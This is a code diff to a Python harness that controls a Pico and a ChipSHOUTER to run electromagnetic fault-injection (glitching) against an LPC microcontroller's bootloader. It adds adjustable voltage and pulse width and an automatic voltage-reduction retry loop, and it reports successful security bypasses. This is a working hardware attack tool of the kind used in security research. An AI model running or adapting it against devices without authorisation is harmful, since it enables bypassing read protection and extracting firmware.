@@ -157,10 +157,20 @@ def setup_lpc_target(ser, verbose=False):
         print("LPC bootloader sync complete")
 
 
-def configure_glitch(ser, verbose=False):
+def configure_glitch(ser, voltage=350, pulse_width=8000, verbose=False):
     """Configure trigger and ChipSHOUTER settings."""
     if verbose:
-        print("\nConfiguring glitch parameters...")
+        print(f"\nConfiguring glitch parameters (V={voltage}, Pulse={pulse_width} cycles)...")
+
+    # Set ChipSHOUTER voltage
+    response = send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5, verbose=verbose)
+    if "#" not in response:
+        raise Exception(f"CS VOLTAGE command failed - no ChipSHOUTER prompt in response: '{response}'")
+
+    # Set Pico glitch pulse width (in cycles)
+    response = send_command(ser, f"SET WIDTH {pulse_width}", wait_time=0.2, verbose=verbose)
+    if "OK:" not in response:
+        raise Exception(f"SET WIDTH command failed - response: {response}")
 
     # Set UART trigger to 0x0d
     response = send_command(ser, "TRIGGER UART 0d", wait_time=0.2, verbose=verbose)
@@ -283,7 +293,7 @@ def perform_quick_glitch_test(ser, verbose=False):
         return "UNKNOWN"
 
 
-def run_glitch_test(num_iterations=1, verbose=True):
+def run_glitch_test(num_iterations=1, voltage=350, pulse_width=8000, voltage_step=10, verbose=True):
     """Run the complete glitch test sequence."""
 
     success_count = 0
@@ -298,64 +308,99 @@ def run_glitch_test(num_iterations=1, verbose=True):
     start_time = time.time()
 
     ser = None
+    current_voltage = voltage
 
     for iteration in range(num_iterations):
         if num_iterations > 1:
             print(f"\nIteration {iteration + 1}/{num_iterations}")
             print("-" * 60)
 
-        try:
-            # First iteration: full setup
-            if iteration == 0:
-                # Connect to Pico
-                ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
-                time.sleep(0.5)
-
-                # Reboot Pico for clean state
-                ser = reboot_pico(ser, verbose=verbose)
-
-                # Setup LPC target and sync
-                setup_lpc_target(ser, verbose=verbose)
-
-                # Configure glitch parameters
-                configure_glitch(ser, verbose=verbose)
-
-                # Perform glitch test
-                result = perform_glitch_test(ser, verbose=verbose)
-            else:
-                # Subsequent iterations: quick test (no setup needed)
-                result = perform_quick_glitch_test(ser, verbose=verbose)
-
-            # Report result
-            if result == "SUCCESS":
-                print("\n✓ GLITCH SUCCESS - Security bypass detected!")
-                success_count += 1
-            elif result == "FAILED_ERROR19":
-                print("\n✗ GLITCH FAILED - Normal operation (error 19)")
-                fail_error19_count += 1
-            elif result == "FAILED_NO_RESPONSE":
-                print("\n✗ GLITCH FAILED - No response from target")
-                fail_no_response_count += 1
-            else:
-                print("\n? GLITCH UNKNOWN - Unexpected response")
-                unknown_count += 1
-
-        except Exception as e:
-            print(f"\n✗ ERROR: {e}")
-            fail_error19_count += 1  # Count exceptions as failures
+        # Voltage reduction loop - retry with lower voltage on no-response
+        voltage_retry = 0
+        while True:
             try:
-                if ser:
-                    ser.close()
-                    ser = None
-            except:
-                pass
-            # For errors, we need to reconnect
-            if iteration < num_iterations - 1:
-                try:
+                # First iteration: full setup
+                if iteration == 0 and voltage_retry == 0:
+                    # Connect to Pico
                     ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
                     time.sleep(0.5)
+
+                    # Reboot Pico for clean state
+                    ser = reboot_pico(ser, verbose=verbose)
+
+                    # Setup LPC target and sync
+                    setup_lpc_target(ser, verbose=verbose)
+
+                    # Configure glitch parameters
+                    configure_glitch(ser, voltage=current_voltage, pulse_width=pulse_width, verbose=verbose)
+
+                    # Perform glitch test
+                    result = perform_glitch_test(ser, verbose=verbose)
+                elif voltage_retry > 0:
+                    # Voltage retry: reconfigure voltage and test
+                    if verbose:
+                        print(f"\nRetrying with reduced voltage: {current_voltage}V")
+
+                    # Update ChipSHOUTER voltage
+                    response = send_command(ser, f"CS VOLTAGE {current_voltage}", wait_time=0.5, verbose=verbose)
+                    if "#" not in response:
+                        raise Exception(f"CS VOLTAGE command failed - no ChipSHOUTER prompt in response: '{response}'")
+
+                    # Perform quick glitch test
+                    result = perform_quick_glitch_test(ser, verbose=verbose)
+                else:
+                    # Subsequent iterations: quick test (no setup needed)
+                    result = perform_quick_glitch_test(ser, verbose=verbose)
+
+                # Check result and decide whether to retry with lower voltage
+                if result == "SUCCESS":
+                    print("\n✓ GLITCH SUCCESS - Security bypass detected!")
+                    success_count += 1
+                    break  # Exit voltage retry loop
+                elif result == "FAILED_ERROR19":
+                    print("\n✗ GLITCH FAILED - Normal operation (error 19)")
+                    fail_error19_count += 1
+                    break  # Exit voltage retry loop
+                elif result == "FAILED_NO_RESPONSE":
+                    print(f"\n✗ GLITCH FAILED - No response from target (V={current_voltage})")
+                    # Try reducing voltage if we have headroom
+                    if current_voltage > voltage_step:
+                        current_voltage -= voltage_step
+                        voltage_retry += 1
+                        fail_no_response_count += 1
+                        if verbose:
+                            print(f"Reducing voltage to {current_voltage}V and retrying...")
+                        continue  # Retry with lower voltage
+                    else:
+                        # Voltage too low, can't reduce further
+                        print(f"Voltage too low ({current_voltage}V), cannot reduce further")
+                        fail_no_response_count += 1
+                        break  # Exit voltage retry loop
+                else:
+                    print("\n? GLITCH UNKNOWN - Unexpected response")
+                    unknown_count += 1
+                    break  # Exit voltage retry loop
+
+            except Exception as e:
+                print(f"\n✗ ERROR: {e}")
+                fail_error19_count += 1  # Count exceptions as failures
+                try:
+                    if ser:
+                        ser.close()
+                        ser = None
                 except:
                     pass
+                # For errors, we need to reconnect
+                if iteration < num_iterations - 1:
+                    try:
+                        ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
+                        time.sleep(0.5)
+                    except:
+                        pass
+                break  # Exit voltage retry loop on exception
+
+        # Reset voltage for next iteration
+        current_voltage = voltage
 
         # Small delay between iterations
         if iteration < num_iterations - 1:
@@ -399,6 +444,24 @@ def main():
         help='Number of glitch test iterations to run (default: 1)'
     )
     parser.add_argument(
+        '-v', '--voltage',
+        type=int,
+        default=350,
+        help='ChipSHOUTER voltage (default: 350)'
+    )
+    parser.add_argument(
+        '-p', '--pulse-width',
+        type=int,
+        default=8000,
+        help='Pico glitch pulse width in cycles (default: 8000)'
+    )
+    parser.add_argument(
+        '--voltage-step',
+        type=int,
+        default=10,
+        help='Voltage reduction step on no-response failures (default: 10)'
+    )
+    parser.add_argument(
         '-q', '--quiet',
         action='store_true',
         help='Suppress verbose output'
@@ -409,6 +472,9 @@ def main():
     try:
         run_glitch_test(
             num_iterations=args.num_iterations,
+            voltage=args.voltage,
+            pulse_width=args.pulse_width,
+            voltage_step=args.voltage_step,
             verbose=not args.quiet
         )
     except KeyboardInterrupt:
